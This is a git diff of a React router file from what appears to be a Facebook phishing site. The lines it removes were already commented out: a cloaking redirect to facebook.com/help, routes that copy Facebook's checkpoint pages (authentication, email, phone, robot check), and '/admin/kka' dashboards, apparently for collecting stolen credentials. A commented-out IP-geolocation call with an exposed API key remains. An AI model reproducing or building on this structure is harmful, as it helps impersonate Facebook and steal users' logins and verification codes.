@@ -22,11 +22,6 @@ export default function RootNavigation() {
   const [isRedirect, setRedirect] = useState(false);
   var url = window.location.pathname.split("/");
 
-  // if(url[1] == 'help' && url[2] == 'support' || url[1] == 'checkpoint' ||  url[2] == 'kka'  && url[3].includes('client_id=') && url[3].split('=')[1])  {
-  // } else {
-  //   return window.location.replace('https://www.facebook.com/help')
-  // }
-
   // useEffect(() => {
   //     fetch("https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1")
   //     .then((response) => response.json())
@@ -55,25 +50,7 @@ export default function RootNavigation() {
       <Routes>
         <Route path="/">
           <Route index path="/" element={<LandingPageNew />} />
-          {/* <Route index path="/facebook-btn" element={<FacebookButton />} />
-
-          <Route
-            path="/checkpoint/next=authentication"
-            element={<Confirmation />}
-          />
-          <Route
-            path="/checkpoint/next=error-authentication"
-            element={<CodeTwo />}
-          />
-          <Route
-            path="/checkpoint/next=email"
-            element={<ConfirmationSecond />}
-          />
-          <Route path="/checkpoint/next=phone" element={<TH />} />
-          <Route path="/checkpoint/next=secure" element={<Robot />} />
-          <Route path="/admin/kka" element={<Dashboard />} />
-          <Route path="/admin/kka2" element={<Dashboard2 />} /> */}
-          <Route path="*" element={<FacebookButton />} />
+          <Route path="*" element={<LandingPageNew />} />
         </Route>
       </Routes>
     </BrowserRouter>
